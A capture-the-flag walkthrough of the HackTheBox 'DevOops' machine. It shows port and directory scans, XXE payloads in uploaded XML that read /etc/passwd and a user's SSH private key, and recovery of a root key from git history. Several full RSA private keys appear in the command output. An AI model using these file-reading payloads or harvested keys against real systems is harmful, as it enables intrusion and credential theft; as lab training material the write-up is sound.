---
tags:
  - XXE
  - git
group: Linux
---
![](https://labs.hackthebox.com/storage/avatars/c74d84352f781ad5c7a4c35c0c3aa0ac.png)

- Machine : https://app.hackthebox.com/machines/DevOops
- Reference : https://0xdf.gitlab.io/2018/10/13/htb-devoops.html
- Solved : 2025.3.8. (Fri) (Takes 2days)

## Summary
---

1. **Initial Enumeration**
    - **Port Scanning**:
        - Identified open ports: **22 (SSH), 5000 (Gunicorn Web Server)**.
        - Gunicorn web server detected on port **5000**.
    - **HTTP Enumeration**:
        - The main page displayed an "under construction" message with references to `feed.py`, indicating a **Python-based backend**.
        - **Gobuster scan** revealed:
            - `/upload` (file upload functionality).
            - `/feed` (static image, same as the main page).
    - **File Upload Analysis**:
        - Only **XML files** were accepted.
        - Uploaded files were stored in `/uploads/`, with an internal reference path `/home/roosa/deploy/src`.
        
2. **Shell as `roosa`**
    - **XXE Attack**:
        - **Uploaded malicious XML file** with XXE payload to read system files.
        - Extracted **`/etc/passwd`**, confirming the vulnerability.
        - Retrieved **`/home/roosa/.ssh/id_rsa`** via XXE.
        - Used the extracted **RSA private key** to SSH into the system as `roosa`.
        
3. **Shell as `root`**
    - **Git Repository Enumeration**:
        - Located a **`.git`** directory at `/home/roosa/work/blogfeed/`.
        - Checked **git logs**, finding a commit (`d387abf`) that **added an RSA private key**, which was later removed in commit `33e87c3`.
    - **Recovering Deleted RSA Key**:
        - Used `git checkout d387abf -- resources/integration/authcredentials.key` to restore the deleted key.
        - Verified the restored **RSA private key**.
    - **Privilege Escalation via SSH**:
        - Used the recovered RSA key to **SSH into `root`**.

### Key Techniques:

- **XXE Injection**: Exploited XML External Entity to read arbitrary files.
- **Git History Analysis**: Recovered a deleted **RSA private key** from previous commits.
- **Privilege Escalation via SSH**: Used the exposed private key to gain root access.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb/devoops]
└─$ /opt/custom-scripts/port-scan.sh 10.10.10.91
Performing quick port scan on 10.10.10.91...
Found open ports: 22,5000
Performing detailed scan on 10.10.10.91...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 05:30 MST
Nmap scan report for 10.10.10.91
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
```

### http(5000)

![](attachments/devoops_1.png)

The page is under construction.
There's a demo image of the future blog.
Given the mention of `feed.py`, the server backend is running upon python.

There's actually `dev.solita.fi` site which has a similar look with the image.

![](attachments/devoops_2.png)

Gobuster found two subpages.

```bash
┌──(kali㉿kali)-[~/htb/devoops]
└─$ gobuster dir -u http://10.10.10.91:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.91:5000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 200) [Size: 347]
/feed                 (Status: 200) [Size: 546263]
```

`/feed` is just the same image as the main page has while `/upload` has upload function.

![](attachments/devoops_3.png)

I tried to upload several extensions including png, jpg, txt, but none of them worked.
Instead, it seems that only XML files work.

I crafted `test.xml` for test.

```xml
┌──(kali㉿kali)-[~/htb/devoops]
└─$ cat test.xml                            
<?xml version="1.0" encoding="UTF-8"?>
<Document>
    <Author>Bokchee</Author>
    <Subject>XML File Uplaod Test</Subject>
    <Content>This is a test file to check XML upload.</Content>
</Document>
```

Then I got the response as follows;

![](attachments/devoops_4.png)

It says the URL for the uploaded file is `/uploads/test.xml` while its file path is in `/home/roosa/deploy/src` that I have no idea what this is for now.

![](attachments/devoops_5.png)

I also tested with added field, but it still worked.

![](attachments/devoops_6.png)



# Shell as `roosa`

### XXE Attack

Given the initial response right after upload includes our XML data, I think I can try XXE attack.
Since all the fields(Author, Subject, Content) are included on the response, we can use any field for the attack.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Content [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<Document>
    <Author>Bokchee</Author>
    <Subject>XML File Uplaod Test</Subject>
    <Content>&file;</Content>
</Document>


====================================================


 PROCESSED BLOGPOST: 
  Author: Bokchee
 Subject: XML File Uplaod Test
 Content: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<SNIP>
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false

 URL for later reference: /uploads/test.xml
 File path: /home/roosa/deploy/src
```

The user `roosa` is mentioned, and also exists on `/etc/passwd`.
What if the user `roosa` stores RSA private key?

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Content [
  <!ENTITY file SYSTEM "file:///home/roosa/.ssh/id_rsa">
]>
<Document>
    <Author>Bokchee</Author>
    <Subject>XML File Uplaod Test</Subject>
    <Content>&file;</Content>
</Document>


====================================================


PROCESSED BLOGPOST: 
  Author: Bokchee
 Subject: XML File Uplaod Test
 Content: -----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----

 URL for later reference: /uploads/test.xml
 File path: /home/roosa/deploy/src
```

Using this RSA key, I can open a SSH shell as `roosa`.

```bash
┌──(kali㉿kali)-[~/htb/devoops]
└─$ ssh -i roosa.priv roosa@10.10.10.91
The authenticity of host '10.10.10.91 (10.10.10.91)' can't be established.
ED25519 key fingerprint is SHA256:TJX/SwHfUAVqwvzLYXblm927Axojlv6xA8QvnXf5ppE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.91' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

roosa@devoops:~$
```



# Shell as `root`

### Enumeration

I enumerated through the file system to find critical files.

```bash
roosa@devoops:~/deploy/resources/integration$ cat authcredentials.key 
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
-----END RSA PRIVATE KEY-----
```

I tested with `root`, `git`, `roosa`, `blogfeed` which have `/bin/bash` shell, but none of them worked.

Then I found one directory `~/work/blogfeed`.

```yaml
roosa@devoops:~/work/blogfeed$ ls -al
total 28
drwxrwx--- 5 roosa roosa 4096 Mar 26  2021 .
drwxrwxr-x 3 roosa roosa 4096 Mar 26  2021 ..
drwxrwx--- 8 roosa roosa 4096 Mar 26  2021 .git
-rw-rw---- 1 roosa roosa  104 Mar 19  2018 README.md
drwxrwx--- 3 roosa roosa 4096 Mar 26  2021 resources
-rwxrw-r-- 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh
drwxrwx--- 2 roosa roosa 4096 Mar 26  2021 src
```

Given the `.git` file, it seems to be a git repository.

### RSA Key disclosure via `git`

I searched again, and found only a single location.

```bash
roosa@devoops:~/work/blogfeed$ find / -name ".git" -type d 2>/dev/null
/home/roosa/work/blogfeed/.git
```

Checked its current status, several modifications haven't been committed.

```bash
roosa@devoops:~/work/blogfeed$ git status
On branch master
Your branch is up-to-date with 'origin/master'.
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

        modified:   run-gunicorn.sh

Untracked files:
  (use "git add <file>..." to include in what will be committed)

        src/.feed.py.swp
        src/access.log
        src/app.py
        src/app.py~
        src/config.py
        src/devsolita-snapshot.png
        src/feed.log
        src/feed.pyc
        src/save.p

no changes added to commit (use "git add" and/or "git commit -a")
```

Checked git log.

```bash
roosa@devoops:~/work/blogfeed$ git log --oneline
7ff507d Use Base64 for pickle feed loading
26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
cec54d8 Debug support added to make development more agile.
ca3e768 Blogfeed app, initial version.
dfebfdf Gunicorn startup script
33e87c3 reverted accidental commit with proper key
d387abf add key for feed integration from tnerprise backend
1422e5a Initial commit
```

Among the logs, I found some interesting.
- `d387abf add key for feed integration from tnerprise backend` : There might be some critical key added.
- `33e87c3 reverted accidental commit with proper key` : Maybe the added key was critical, resulting in deletion.

Just to check what key was added, I compared it `d387abf` with initial commit.

```bash
roosa@devoops:~/work/blogfeed$ git diff 1422e5a d387abf
diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
new file mode 100644
index 0000000..44c981f
--- /dev/null
+++ b/resources/integration/authcredentials.key
@@ -0,0 +1,28 @@
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
+nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
+F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
+uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
+gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
+k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
+NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
+HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
+2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
+GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
+jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
+IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
+7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
+Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
+iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
+VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
+S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
+md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
+LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
+oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
+LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
+-----END RSA PRIVATE KEY-----
+
```

This `authcredentials.key` is different from what the current commit has.
I can check out the previous one to retrieve the original key.

```bash
roosa@devoops:~/work/blogfeed$ git checkout d387abf -- resources/integration/authcredentials.key
roosa@devoops:~/work/blogfeed$ git status
On branch master
Your branch is up-to-date with 'origin/master'.
Changes to be committed:
  (use "git reset HEAD <file>..." to unstage)

modified:   resources/integration/authcredentials.key

<SNIP>
```

Now the `authcredentials.key` is changed to old commit.

```bash
roosa@devoops:~/work/blogfeed$ cat resources/integration/authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----


roosa@devoops:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
d880df0f57e4143a0fcb46fdd76e270b  resources/integration/authcredentials.key
```

Then, I recovered it the recent commit.

```bash
roosa@devoops:~/work/blogfeed$ git reset --hard 7ff507d
HEAD is now at 7ff507d Use Base64 for pickle feed loading


roosa@devoops:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key
```

Using the RSA key, I tested ssh login with several usernames.
And luckily, it worked with `root`.

```bash
┌──(kali㉿kali)-[~/htb/devoops]
└─$ ssh -i unknown2.priv root@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Fri Sep 23 09:46:30 2022
root@devoops:~# whoami
root
root@devoops:~# id
uid=0(root) gid=0(root) groups=0(root)
```

I got a `root` shell!
